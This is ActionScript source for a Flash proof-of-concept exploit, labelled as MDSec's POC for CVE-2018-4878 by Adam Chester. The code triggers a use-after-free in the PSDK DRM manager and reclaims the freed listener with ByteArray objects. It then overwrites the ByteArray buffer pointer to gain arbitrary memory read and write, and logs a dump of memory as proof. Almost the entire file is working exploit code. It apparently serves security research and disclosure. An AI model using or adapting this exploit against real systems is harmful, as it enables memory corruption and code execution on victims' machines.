package
{
	import flash.display.FrameLabel;
	import flash.display.Sprite;
	import flash.events.Event;
	import com.adobe.tvsdk.mediacore.*;
	import flash.events.TimerEvent;
	import flash.net.LocalConnection;
	import flash.utils.ByteArray;
	import flash.external.ExternalInterface;
	import flash.utils.Timer;
	import flash.text.TextField;
	
	/**
	 * ...
	 * @author xpn
	 */
	 
	public class Main extends Sprite 
	{
		
		var danglingpointer :MyListener;
		var mediaplayer :MediaPlayer;
		var listener :MyListener;
		var timer :Timer;

		// Used to trigger UAF
		public function triggeruaf() : void {
			var sdk :PSDK = null;
			var dispatch:PSDKEventDispatcher = null;

			sdk = PSDK.pSDK;
			dispatch = sdk.createDispatcher();

			this.mediaplayer = sdk.createMediaPlayer(dispatch);
			this.listener = new MyListener();
			this.mediaplayer.drmManager.initialize(this.listener);
			this.listener = null;
		}
		
		
		public function exploit():void {
			
			this.triggeruaf();
			
			try {
				new LocalConnection().connect("test");
				new LocalConnection().connect("test");
			} catch (e:Error) {
				this.danglingpointer = new MyListener();
			}
			
			this.timer = new Timer(100, 1000);
			this.timer.addEventListener("timer", this.uafcheck);
			this.timer.start();		
		}
		
		var arr :Array;

		public function uafcheck(param1:TimerEvent) : void {
			if (this.danglingpointer.a1 != 0x31337) {
				
				arr = new Array(10);
				
				this.AddToLog("Corrupted object found, stopping timer");
				this.timer.stop();
				
				this.AddToLog("Attempting to allocate ByteArray in place of DRMOperationCompleteListener");
				for (var i = 0; i < 100; i++) {
					arr[i] = new Mem_Arr();
					arr[i].length = 0x512;
					arr[i].position = 0x31;
				}
								
				// Here, we have a MyListener object (this.danglingpointer)
				// which is actually pointing to a Mem_Arr (arr[0]) object
				
				// Memory dump of the Mem_Arr object
				trace("===============");
				trace(this.danglingpointer.a1.toString(16));
				trace(this.danglingpointer.a2.toString(16));
				trace(this.danglingpointer.a3.toString(16));
				trace(this.danglingpointer.a4.toString(16));
				trace(this.danglingpointer.a5.toString(16));
				trace(this.danglingpointer.a6.toString(16));
				trace(this.danglingpointer.a7.toString(16));
				trace(this.danglingpointer.a8.toString(16));
				trace(this.danglingpointer.a9.toString(16));
				trace(this.danglingpointer.a10.toString(16));
				trace(this.danglingpointer.a11.toString(16));
				trace(this.danglingpointer.a12.toString(16));
				trace(this.danglingpointer.a13.toString(16));
				trace(this.danglingpointer.a14.toString(16)); // m_buffer address
				trace(this.danglingpointer.a15.toString(16));
				trace(this.danglingpointer.a16.toString(16));
				trace(this.danglingpointer.a17.toString(16));
				trace(this.danglingpointer.a18.toString(16));
				trace(this.danglingpointer.a19.toString(16));
				trace(this.danglingpointer.a20.toString(16));
				trace(this.danglingpointer.a21.toString(16));
				trace(this.danglingpointer.a22.toString(16));
				trace(this.danglingpointer.a23.toString(16));
				trace(this.danglingpointer.a24.toString(16));
				trace(this.danglingpointer.a25.toString(16));
				trace(this.danglingpointer.a26.toString(16));
				trace(this.danglingpointer.a27.toString(16));
				trace(this.danglingpointer.a28.toString(16));
				trace(this.danglingpointer.a29.toString(16));
				trace(this.danglingpointer.a30.toString(16));
				trace(this.danglingpointer.a31.toString(16)); // o1 property address
				trace(this.danglingpointer.a32.toString(16)); 
				trace(this.danglingpointer.a33.toString(16));
				trace(this.danglingpointer.a34.toString(16));
				
				this.AddToLog("Updating Object reference to point to m_buffer of ByteArray");
				// Set o1 to the m_buffer
				this.danglingpointer.a31 = this.danglingpointer.a15 - 0x10;
				
				//arr[0].RW();  // Used to demo Object dereference R/W
				
				this.AddToLog("Pwning ByteArray via m_buffer");
				arr[0].PwnBuffer(this);
				
				var a:ByteArray = new ByteArray();
				AddToLog("\nByteArray now has a length of: " + arr[0].length.toString(16));
				AddToLog("\nTesting exploit by dumping some arbitrary memory: ");
				
				arr[0].position = this.danglingpointer.a1;
				for (var i = 0; i < 10; i++) {
					AddToLog(arr[0].position.toString(16) +" : " + arr[0].readInt().toString(16));
				}
			}
		}
		
		public function Main() 
		{
			if (stage) init();
			else addEventListener(Event.ADDED_TO_STAGE, init);
		}
		
		private var log :TextField = new TextField();
		
		public function AddToLog(text :String) : void {
			this.log.text += "\n" + text;
		}
		
		private function init(e:Event = null):void 
		{
			removeEventListener(Event.ADDED_TO_STAGE, init);
			
			this.log.width = 400;
			this.log.height = 1500;
			this.log.x = 0;
			this.log.y = 0;
			this.addChild(this.log);
			
			AddToLog("MDSec CVE-2018-4878 POC, by Adam Chester\n");
			
			exploit();
			return;
			
		}
		
	}
	
}